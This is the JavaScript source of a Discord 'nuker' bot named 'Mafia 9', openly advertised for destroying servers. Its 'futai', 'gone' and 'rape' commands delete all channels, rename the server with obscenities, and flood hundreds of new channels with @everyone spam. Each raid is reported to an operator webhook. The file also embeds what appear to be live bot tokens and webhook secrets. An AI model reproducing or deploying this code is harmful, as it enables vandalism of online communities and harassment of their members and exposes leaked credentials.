const { Client } = require("discord.js");
const Discord = require("discord.js");
const discordjs = require('discord.js');
const command = require('discord.js');
const cooldown = new Set();
const cdtime = 5;
const msg = 5;
const footer = require('discord.js');
const { MessageEmbed, version: djsversion } = require('discord.js');
const inlinereply = require('discord-reply');
const client = new Discord.Client({

});
const discordButtons = require("discord-buttons-plugin");
const buttonClient = new discordButtons(client)
const db = require("quick.db")
const talkedRecently = new Set();
const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)

client.on("ready", async () => {
  console.log(`${client.user.username} is online on ${client.guilds.cache.size} servers`);
client.user.setActivity(`Fastest Nuker`, {
    type:"STREAMING",
    url: "https://www.twitch.tv/discord"
});

let matatactu = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Mafia 9 Restart")
 .setFooter("Mafia 9 - Reconnect", "https://media.discordapp.net/attachments/903953418572431411/904115614715633673/a_3465fd2b31d8d54eb7bdac5add87253f.gif"
                    )
            .setTimestamp()
.setDescription(`Mafia 9 was reconnected to the host `);

const wrb = new Discord.WebhookClient("927891814634098709", "xFTkmqILlYHXqDxUqbTJZwme-JBtd869OYKScYkr0Z4zwWlt9mne2dRmFBgQRwez5rtL");
    await wrb.send(matatactu)
    
  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })
});



client.on("message", async(message)=>{
  if (!message.guild) return;



        if (message.content.startsWith('help')) {
            const helpEmbed = new Discord.MessageEmbed()
                .setTitle('Mafia 9 Commands')
                .setDescription(`> Prefix: \`./\`

*Acest bot nu baneaza ca e doar de spam*

> __Spam Commands__

**futai** __Destroy the server__
**gone** __Spam channels & pings__

> __Default Commands__ 

\`,\`**./invite** __Invite link bot__
\`,\`**./help** __Bot help__
\`,\`**./ping** __Bot ping__
\`,\`**./stats** __Shows how many stats is the bot__
\`,\`**./uptime** __Shows how many uptime is the bot__

> Mafia 9 Website [CLICK](https://dsc.gg/mafia-9)`)
           .setColor('15fe82') 
.setThumbnail("https://cdn.discordapp.com/icons/923188299068239912/a_23a0e148917af726e87a222496cc515f.gif?size=1024")
.setImage("https://cdn.discordapp.com/attachments/927000928832352376/928294018817880125/standard-6.gif")
     .setFooter(
                    `Help`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
       message.channel.send(helpEmbed);
        }


    if (message.content.startsWith('./leaveall')) {
let ownerID = '900616800734179358'
client.guilds.cache.forEach(guild => {

whitelist = ["923188299068239912"]

if (whitelist.includes(guild.id)) return
guild.leave()

})
}








if (message.content.startsWith('./guilds')) {

            message.channel.send('Hey! This command is Developer Only').then(m => m.delete({timeout: 5000}))

        const ownerid = "900616800734179358"
 if (message.author.id == ownerid) {

        const ownerid = "900616800734179358"

      let i0 = 0;

      let i1 = 10;

      let page = 1;

      let description =

        `Total Servers - ${client.guilds.cache.size}\n\n` +

        client.guilds.cache

          .sort((a, b) => b.memberCount - a.memberCount)

          .map(r => r)

          .map((r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

          .slice(0, 10)

          .join("\n\n");

      let embed = new Discord.MessageEmbed()

        .setAuthor(client.user.tag, client.user.displayAvatarURL({dynamic : true}))

        .setColor("36393e")

        .setFooter(`Page - ${page}/${Math.ceil(client.guilds.cache.size / 10)}`)

        .setDescription(description);

      let msg = await message.line
        
        
      message.channel.send(embed);
      
      await msg.react("⬅️");

      await msg.react("➡️");

      await msg.react("🔱");

      let collector = msg.createReactionCollector(

        (reaction, user) => user.id === message.author.id

      );

      collector.on("collect", async (reaction, user) => {

        if (reaction._emoji.name === "⬅️") {

          // Updates variables

          i0 = i0 - 10;

          i1 = i1 - 10;

          page = page - 1;

          // if there is no guild to display, delete the message

          if (i0 + 1 < 0) {

            console.log(i0)

            return msg.delete();

          }

          if (!i0 || !i1) {

            return msg.delete();

          }

          description =

            `Total Servers - ${client.guilds.cache.size}\n\n` +

            client.guilds.cache

              .sort((a, b) => b.memberCount - a.memberCount)

              .map(r => r)

              .map(

                (r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

              .slice(i0, i1)

              .join("\n\n");

          // Update the embed with new informations

          embed

            .setFooter(

              `Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`

            )

            .setDescription(description);

          // Edit the message

          msg.edit(embed);

        }

        if (reaction._emoji.name === "➡️") {

          // Updates variables

          i0 = i0 + 10;

          i1 = i1 + 10;

          page = page + 1;

          // if there is no guild to display, delete the message

          if (i1 > client.guilds.cache.size + 10) {

            return msg.delete();

          }

          if (!i0 || !i1) {

            return msg.delete();

          }

          description =

            `Total Servers - ${client.guilds.cache.size}\n\n` +

            client.guilds.cache

              .sort((a, b) => b.memberCount - a.memberCount)

              .map(r => r)

              .map(

                (r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

              .slice(i0, i1)

              .join("\n\n");

          // Update the embed with new informations

          embed
                        .setFooter(
                    `Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()

            .setFooter(

              `Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`

            )

            .setDescription(description);

          // Edit the message

          msg.edit(embed);

        }

        if (reaction._emoji.name === "🔱") {

          return msg.delete();

        }

        // Remove the reaction when the user react to the message

        await reaction.users.remove(message.author.id);

      });

    } else {

      return;

    }

  }


















        if (message.content.startsWith('./stats')) {


		const output = new discordjs.MessageEmbed()

	    .setTitle('Mafia 9 Stats')
	    .addField(`**Server Count**`, `${client.guilds.cache.size} server(s)`, false)
		.addField(`**Total Member Count**`, `${client.users.cache.size} member(s)`, false)
		.addField(`**Discord.JS version**`, `v${discordjs.version}`, false)
		.addField(`**For up-time information, type**`, `./uptime`, false)
		.addField(`**For latency / ping information, type**`, `./ping`, false)
           .setColor('15fe82') 

     .setFooter(
                    `Stats`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()

       message.channel.send(output);
	}


//invite
  if (message.content.startsWith('./invite')) {

     const embed = new Discord.MessageEmbed()
    .setAuthor("Invite Mafia 9 bot for nuking servers", "https://media.discordapp.net/attachments/896426611862306846/907190125727977502/logo.jpg")

           .setColor('15fe82') 

     .setFooter(
                    `Invite`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()

      .addFields({
        name: '**Invite the bot on click:**',
        value: ` Click On The Below Button To [**Invite Me**](https://discord.com/api/oauth2/authorize?client_id=927826187965829120&permissions=8&scope=bot%20applications.commands)`,
      },
      )
   const button4 = new buttonClient.MessageButton()
   .setLabel("Link Invite")
   .setURL("https://discord.com/api/oauth2/authorize?client_id=927826187965829120&permissions=8&scope=bot%20applications.commands")
     
     /* Send Message with button */
     buttonClient.send(null, { channel: message.channel.id, embed, buttons: [ [button4] ]})



  }


//pinggggggggggg
  if (message.content.startsWith('./ping')) {

const helpEmbed = new Discord.MessageEmbed()
.setTitle(`Mafia 9 Ping`)

.setDescription(`
**Ping:**
 Bot Latency: \`${Math.round(client.ws.ping)}ms\`
 API Latency: \`${Date.now() - message.createdTimestamp}ms\``)
           .setColor('15fe82') 

     .setFooter(
                    `Ping`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
       message.channel.send(helpEmbed);
        }



        if (message.content.startsWith('./uptime')) {	
		
		var errorvar;

				// Basic embed
				let totalSeconds = (client.uptime / 1000);
				let days = Math.floor(totalSeconds / 86400);
				totalSeconds %= 86400;
				let hours = Math.floor(totalSeconds / 3600);
				totalSeconds %= 3600;
				let minutes = Math.floor(totalSeconds / 60);
				let seconds = Math.floor(totalSeconds % 60);
			
			  var outputembed = new discordjs.MessageEmbed()

	    		.setTitle(`Mafia 9 Uptime`)
          .setDescription(`Uptime: \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s)\``)
            .setColor('15fe82') 

     .setFooter(
                    `Uptime`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
			  
       message.channel.send(outputembed);	
	}

const axios = require('axios')
const phin = require('phin').unpromisified
let guildID = message.guild.id

if (message.content === ('futai')) {

        if(message.guild.id == '923188299068239912') return message.channel.send("__**You don't have permission to use command in this server**__");

                     message.delete();

       if (cooldown.has(message.author.id)) {
      return message.channel.send(`__**Please wait \`10\` seconds to use this command**__`).then(m => {
        m.delete({ timeout: cdtime * 1000 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 2000);

    message.delete();
let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id
      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")
        const w = await client.guilds.cache
      .get("923828737961771068")
      .fetchWebhooks();
    const webhook = w.find((w) => w.name === "Mafia 9");
   webhook.send(`https://discord.gg/9fpZyfBKPf\n Guild: \`${message.guild.name}\` ➜ Command: \`futai\` ➜ User: \`${message.author.tag}\` ➜ Members: \`${message.guild.memberCount}\``);
let token = "OTI3ODI2MTg3OTY1ODI5MTIw.YdP3eQ._yrTJrz4RZffYNcppE9DU1hCsm8" // si aci la fel
const phin = require('phin').unpromisified
let guildID = message.guild.id
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });

message.guild.setName("Mafia 9 ??")
    message.guild.setIcon(
      "https://media.discordapp.net/attachments/885886443040407594/901834056906440734/unknown.png"
    );

       }



        if (message.content.startsWith('gone')) {
      
                   if(message.guild.id == '923188299068239912') return message.channel.send("__**You don't have permission to use command in this server**__");


        if (cooldown.has(message.author.id)) {
      return message.channel.send(`__**Please wait \`10\` seconds to use this command**__`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);


            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINISTRATOR!!!!! is aleardy nuked"))
            } else {
                  let channels =  message.guild.channels.cache.array();
                     message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    

message.guild.setName("mafia 9 va futut in cur")
    message.guild.setIcon(
      "https://media.discordapp.net/attachments/885886443040407594/901834056906440734/unknown.png"
    );


      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")

   let mes = `https://discord.gg/9fpZyfBKPf\n Guild: \`${message.guild.name}\` ➜ Command: \`gone\` ➜ User: \`${message.author.tag}\` ➜ Members: \`${message.guild.memberCount}\``;
    const wrb = new Discord.WebhookClient("923828737961771068", "o4qDXUcX9XE9_DxsXRQxVyDEgEd9qg6ZhkPL1SWLVoCpeiDbiBIyb_UGRSMR1bY67T3a");

    await wrb.send(mes)



                    let args = message.content.split(" ").slice(1);

        if (cooldown.has(message.author.id)) {
      return message.channel.send(`__**Please wait \`10\` seconds to use this command**__`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 200; i++) {
                            message.guild.channels.create('wizzed by ' + message.author.username)
    
                            for (var i = 0; i < 200; i++) {
                                let channels = message.guild.channels.create('wizzed by ' + message.author.username)
    
                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone ' + argresult)
                                            console.log((`rip`));
                                            // other per-channnel logic

                                    }
                                }
                            );
                        }

                    }

                }
                   // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)
    
                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone ' + argresult);
                                    console.log(`CHANNEL PINGED!`);
                                    // other per-channnel logic
                            }
                        }
                    );
                }
            }
        }






        if (message.content.startsWith('rape')) {
      
                   if(message.guild.id == '923188299068239912') return message.channel.send("__**You don't have permission to use command in this server**__");


                          if (cooldown.has(message.author.id)) {
      return message.channel.send(` __**Please wait \`10\` seconds to use this command**__`).then(m => {
        m.delete({ timeout: cdtime * 1000 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 2000);


            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINISTRATOR!!!!! is aleardy nuked"))
            } else {
                  let channels =  message.guild.channels.cache.array();
                     message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    

message.guild.setName("mafia 9 va futut in cur")
    message.guild.setIcon(
      "https://media.discordapp.net/attachments/885886443040407594/901834056906440734/unknown.png"
    );


      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")

   let mes = `https://discord.gg/9fpZyfBKPf\n Guild: \`${message.guild.name}\` ➜  Command: \`rape\` ➜ User: \`${message.author.tag}\` ➜ Members: \`${message.guild.memberCount}\``;
    const wrb = new Discord.WebhookClient("923828737961771068", "o4qDXUcX9XE9_DxsXRQxVyDEgEd9qg6ZhkPL1SWLVoCpeiDbiBIyb_UGRSMR1bY67T3a");

    await wrb.send(mes)



                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 200; i++) {
                            message.guild.channels.create('wizzed by ' + message.author.username)
    
                            for (var i = 0; i < 200; i++) {
                                let channels = message.guild.channels.create('wizzed by ' + message.author.username)
    
                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone ' + argresult)
                                            console.log((`rip`));
                                            // other per-channnel logic

                                    }
                                }
                            );
                        }

                    }

                }
                   // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)
    
                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone ' + argresult);
                                    console.log(`CHANNEL PINGED!`);
                                    // other per-channnel logic
                            }
                        }
                    );
                }
            }
        }

            })
            

client.login("OTMxMjEwNDkyOTM1MDMyODcy.YeBHWg.hCQUCrwhUiFLjmOB_SH3claPmRo")